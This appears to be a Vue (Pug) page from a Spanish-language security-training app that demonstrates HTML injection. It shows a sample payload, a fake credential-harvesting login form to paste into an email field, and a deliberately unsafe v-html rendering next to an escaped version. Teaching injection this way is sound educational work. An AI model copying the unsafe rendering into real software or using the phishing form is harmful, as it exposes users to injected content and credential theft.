<template lang="pug">
  .h-screen.w-screen.bg-gray-200
    .h-screen
      CDotsMenuContacts
      .h-screen.overflow-hidden
        div.w-full.bg-white.shadow-xl.h-20
          div.absolute.right-0
            div.flex.items-center
              div.text-xl.pr-4.text- {{$store.getters.getcurrentUser}}
              amplify-sign-out
        CMenu
        div.block.lg_flex.justify-end.h-screen.overflow-y-scroll(class="w-full h-screen") 
          div.w-full.h-screen.overflow-y-scroll(class="w-full lg_w-6/12" :class="[ $store.getters.darkIsActive ? 'text-red-700' : 'text-green-700']") 
            CChangeMode.lg_hidden
            div.w-full.flex.justify-center
                CCard.h-16.flex.justify-content.items-center.bg-white.mb-6.mt-6.text-lg(class="w-11/12")
                  template(slot='content')
                    span.ml-4.text-3xl Inyección HTML
            div.w-full.flex.justify-center
              CCard.h-64.flex.justify-content.items-center.bg-white.mb-6.mt-6.overflow-scroll-y(class="w-11/12")
                template(slot='content')
                  form.w-full
                    h2.text-2xl.ml-4 Form ejecución de código
                    p.text-red-700.ml-4(:class="[ $store.getters.darkIsActive ? 'text-red-700' : 'text-green-700']") Ingresa tu email
                    input.text-gray-700.mt-2.ml-4(style="focus:outline-none" placeholder="example@mail.com" type="text" v-model="form.username" class="w-11/12")
                    div.mt-8.flex.justify-content
                      button.ml-4.bg-red-700.text-black.text-lg.rounded-lg.py-4.shadow-xl.hover_bg-blue-700.focus_outline-none(@click.prevent="fetchSomething" class="w-11/12" :class="[ $store.getters.darkIsActive ? 'bg-red-700' : 'bg-green-700']") Enviar Data 
            div.w-full.flex.justify-center.overflow-scroll-y
              CCard.justify-content.items-center.bg-white.mb-6.mt-6(class="w-11/12")
                template(slot='content')
                  h2.text-2xl.ml-4.block Ejemplo ejecución de código
                  h3 Copie el siguiente código y peguelo en el input de email solicitado
                  p.bg-black.m-8.overflow-hidden {{'&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;h2 style="color:black;text-align:center;font-size:3rem;font-weight: 700;display: block; margin-block-start: 0.83em;margin-block-end: 0.83em;margin-inline-start: 0px; margin-inline-end: 0px;"&gt;¡Bienvenido!&lt;/h2&gt; &lt;div style="margin-left: auto;margin-right: auto;background-color: white;"&gt; &lt;p style="color:#718096;font-weight: 500;"&gt;Ingresa tus credenciales.&lt;/p&gt; &lt;div&gt; &lt;form method="GET" action="http://www.google.com" style="padding-left: 1rem; padding-right: 1rem;"&gt; &lt;label&gt;Email&lt;/label&gt; &lt;input type="email" placeholder="Ingresa tu correo electrónico" required="required"  autocomplete="off" style="display: block;background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAkCAYAAADo6zjiAAAAAXNSR0IArs4c6QAAAnVJREFUWAntVzuL4lAUPokBsVB0t9odK8VCLCal3Q4WbmUpCFv6DyymEmys9gf4B4RlS7GwEWQsBAsL195q2J3KWIiVrz0nJBcTk9yr3jCw7AG5j3PO9325j2OiAFq73X7Y7/ffsft0Op0+05wsUxTlD2K9aJr23Gw2f7txFYv8FxJ/dDtljlHICkU8ukWo9ORhk9ODEIe1yo7nUnH05JgJd3DBpcre8yD9Xly0Au9q/7aAfD4PjUYDqPWzUFegUChAIpEAav0sVAF4901eu/USEaoAL0L3nENANBqFbDYLqVTKHQe3+i6AXBOaPU4mk1Cv1yEej8PxeIR+vw/z+dx03+qzsYNatgLFYtEkp2BVVaFUKrG8W30MIKDDBATEhOpiAqbTKWw2G5OMtmA0GjHiW30MIKCjtFqtk+2ng5ZOp8EwDFiv1/a02Qb5HIGcAV7JNwwZW+8Hrw4BnFypbhRioAidbYFUdAEw/Gf8QO8H7ybA0viF1QEB0cIhmUwGqtUqxGIxM2cymcBwOLzIx1X4JF0A1YxyuWzWkgtGjwlpAiKRCFQqFdB13YPGf0qagFqtBrlczmSiOkJGFZVnKl4Hem+/26hYEfHhcIBerwe73U4IkyS+CEVygpbLJQwGA+h2u7BYLIC2RMSwFmjPeB+/4om8+8NkNpsxzqCXEBaEHZW+VFDEIyb8kLUd5wS8vnkIrc+lb7xg8p//d4jE82L4x5SHcKf/v4CrCxEe1Deq4byVX61WrBBtt1vPcMK6WgAijfFX80Q8m+x0Omcj3+746jNAdQOVG76Qgg7CIKyrBeCVfcVEHQF+0hIK8rEwyqFcwiCsv+R847qxq2vXAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: pointer;"&gt; &lt;label&gt;Password&lt;/label&gt; &lt;input type="password" placeholder="Ingresa tu correo electrónico" required="required"  autocomplete="off" style="display: block;background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAkCAYAAADo6zjiAAAAAXNSR0IArs4c6QAAAnVJREFUWAntVzuL4lAUPokBsVB0t9odK8VCLCal3Q4WbmUpCFv6DyymEmys9gf4B4RlS7GwEWQsBAsL195q2J3KWIiVrz0nJBcTk9yr3jCw7AG5j3PO9325j2OiAFq73X7Y7/ffsft0Op0+05wsUxTlD2K9aJr23Gw2f7txFYv8FxJ/dDtljlHICkU8ukWo9ORhk9ODEIe1yo7nUnH05JgJd3DBpcre8yD9Xly0Au9q/7aAfD4PjUYDqPWzUFegUChAIpEAav0sVAF4901eu/USEaoAL0L3nENANBqFbDYLqVTKHQe3+i6AXBOaPU4mk1Cv1yEej8PxeIR+vw/z+dx03+qzsYNatgLFYtEkp2BVVaFUKrG8W30MIKDDBATEhOpiAqbTKWw2G5OMtmA0GjHiW30MIKCjtFqtk+2ng5ZOp8EwDFiv1/a02Qb5HIGcAV7JNwwZW+8Hrw4BnFypbhRioAidbYFUdAEw/Gf8QO8H7ybA0viF1QEB0cIhmUwGqtUqxGIxM2cymcBwOLzIx1X4JF0A1YxyuWzWkgtGjwlpAiKRCFQqFdB13YPGf0qagFqtBrlczmSiOkJGFZVnKl4Hem+/26hYEfHhcIBerwe73U4IkyS+CEVygpbLJQwGA+h2u7BYLIC2RMSwFmjPeB+/4om8+8NkNpsxzqCXEBaEHZW+VFDEIyb8kLUd5wS8vnkIrc+lb7xg8p//d4jE82L4x5SHcKf/v4CrCxEe1Deq4byVX61WrBBtt1vPcMK6WgAijfFX80Q8m+x0Omcj3+746jNAdQOVG76Qgg7CIKyrBeCVfcVEHQF+0hIK8rEwyqFcwiCsv+R847qxq2vXAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: pointer;"&gt; &lt;button type="submit" style="width: 91.666667%;font-size: 1.125rem;color: #000;box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);    padding-top: 1rem; padding-bottom: 1rem;border-radius: 0.5rem;    background-color: #c53030;"&gt; Ingresar &lt;/button&gt; &lt;p&gt;&lt;a href="https://www.worldchilli.com/"&gt; Click aqui para contactarnos contigo.&lt;/a&gt;.&lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;'}}
            div.w-full.flex.justify-center.overflow-scroll-y
              CCard.justify-content.items-center.bg-white.m-8(class="w-11/12")
                template(slot='content')
                  h2.text-2xl.ml-4.block Form resultado de código
                  p(:class="[ $store.getters.darkIsActive ? 'block' : 'hidden']") Cuado los inputs no se encuentra saneados se puede ingresar codigo html y crear un formulario como en el ejemplo.
                  p(:class="[ $store.getters.darkIsActive ? 'hidden' : 'block']") Cuanto los inputs se encuentran saneados se muestra el codigo html simplemente como html
                  div.m-8.block(v-html="form.username" :class="[ $store.getters.darkIsActive ? 'block' : 'hidden']")
                  div.block(:class="[ $store.getters.darkIsActive ? 'hidden' : 'block']") {{form.username}}
            div.w-full.flex.justify-center.overflow-scroll-y
              CCard.h-32.justify-content.items-center.bg-white.mb-6.mt-6(class="w-11/12")
                template(slot='content')
                  h4.text-2xl.ml-4.block Derechos Reservados CHRONOS
          div.w-full(class="w-full h-screen lg_w-3/12 overflow-y-scroll") 
            CChangeMode.hidden.md_block
            div.w-full.flex.justify-center
              CCard.h-64.flex.justify-content.items-center.bg-white.mb-6.mt-6(class="w-11/12")
                template(slot='content')
                  span.ml-4.mr-4 RESEÑA
                  span.ml-4.mr-4 Una app es vulnerable a los ataques de inyección cuando no hay un protocolo de validación, filtración o saneamiento de los datos del usuario
</template>

<script>
import { components } from 'aws-amplify-vue'
import CDotsMenuContacts from '~/components/CDotsMenuContacts.vue'
import CMenu from '~/components/CMenu.vue'
import CCard from '~/components/CCard.vue'
import CChangeMode from '~/components/CChangeMode.vue'

export default {
  components: {
    ...components,
    CDotsMenuContacts,
    CMenu,
    CCard,
    CChangeMode
  },
  data() {
    return {
      messageLogin: '',
      form: {
        username: '',
        password: ''
      }
    }
  },
  methods: {
    async fetchSomething() {
      const ip = await this.$axios.$get(
        'https://km6ewh68yj.execute-api.us-east-1.amazonaws.com/dev/users',
        {
          headers: {
            'Access-Control-Allow-Origin': '*'
          }
        }
      )
      console.log(ip)
    }
  }
}
</script>
